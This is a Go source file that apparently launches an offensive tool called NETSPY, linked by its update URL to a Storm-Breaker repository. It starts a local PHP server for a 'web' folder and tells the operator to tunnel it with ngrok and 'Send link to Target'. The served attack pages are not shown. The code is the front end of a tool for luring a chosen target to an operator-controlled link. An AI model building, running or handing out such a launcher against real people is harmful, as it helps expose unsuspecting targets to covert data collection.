package main

import (
    "fmt"
    "os"
	"net/http"
	"encoding/json"
	"time"
    "os/exec"
    "syscall"
	"log"
	"github.com/fatih/color"
)

const PORT = 3000

func main() {
	
	dependency()
    checkUpdate()

    for {
        banner()
        runPhpServer(PORT)

        // Host a directory using strom-web
        go func() {
            cmd := exec.Command("php", "-d", "web/index.php")
            cmd.Stdout = os.Stdout
            cmd.Stderr = os.Stderr
            if err := cmd.Run(); err != nil {
                fmt.Fprintln(os.Stderr, err)
                os.Exit(1)
            }
        }()
	
		color.HiGreen("[+] Please run NGROK On Port 3000 & Send link to Target : ngrok http 3000")
		red := color.New(color.FgRed)
		boldRed := red.Add(color.Bold)
		boldRed.Println("[+] Press enter or CTRL+C to turn off localhost and exit.")
        fmt.Print("")
		fmt.Print("[+] ")
        var input string
        fmt.Scanln(&input)

        killPhpProc()
        os.Exit(0)
    }
}

func checkUpdate() {
	httpClient := &http.Client{
		Timeout: time.Second * 10,
	}
	resp, err := httpClient.Get("https://raw.githubusercontent.com/ultrasecurity/Storm-Breaker/main/Settings.json")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer resp.Body.Close()

	var data map[string]interface{}
	if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	jsonFile, err := os.Open("web/Settings.json")
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer jsonFile.Close()

	var localData map[string]interface{}
	if err := json.NewDecoder(jsonFile).Decode(&localData); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	if localData["version"].(float64) < data["version"].(float64) {
		fmt.Println("Please update tool")
		os.Exit(1)
	}
}

func dependency() {
    checkPhp := exec.Command("php", "-v")
    _, err := checkPhp.Output()
    if err != nil {
        log.Fatalln("please install php \n command > sudo apt install php")
    }
}

func banner(){
fmt.Println("")
color.Red("███╗   ██╗███████╗████████╗███████╗██████╗ ██╗   ██╗")
color.Blue("████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚██╗ ██╔╝")
color.Red("██╔██╗ ██║█████╗     ██║   ███████╗██████╔╝ ╚████╔╝")
color.Blue("██║╚██╗██║██╔══╝     ██║   ╚════██║██╔═══╝   ╚██╔╝")  
color.Red("██║ ╚████║███████╗   ██║   ███████║██║        ██║")  
color.Blue("╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚═╝        ╚═╝") 
fmt.Println("")
c := color.New(color.FgCyan).Add(color.Underline)
c.Println("[+] Author: Aryanstha & SerinaPokharel")
fmt.Println("")
		
	}

func runPhpServer(port int) {
    // Start the PHP server on the specified port
	dir := "web"
    cmd := exec.Command("php", "-S", fmt.Sprintf("localhost:%d", port), "-t", dir)
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    go func() {
        if err := cmd.Run(); err != nil {
            fmt.Fprintln(os.Stderr, err)
            os.Exit(1)
        }
    }()
}

func killPhpProc() {
    // Kill the PHP server process
    p, err := os.FindProcess(os.Getpid())
    if err != nil {
        fmt.Fprintln(os.Stderr, err)
        return
    }
    if err := p.Signal(syscall.SIGINT); err != nil {
        fmt.Fprintln(os.Stderr, err)
    }
}
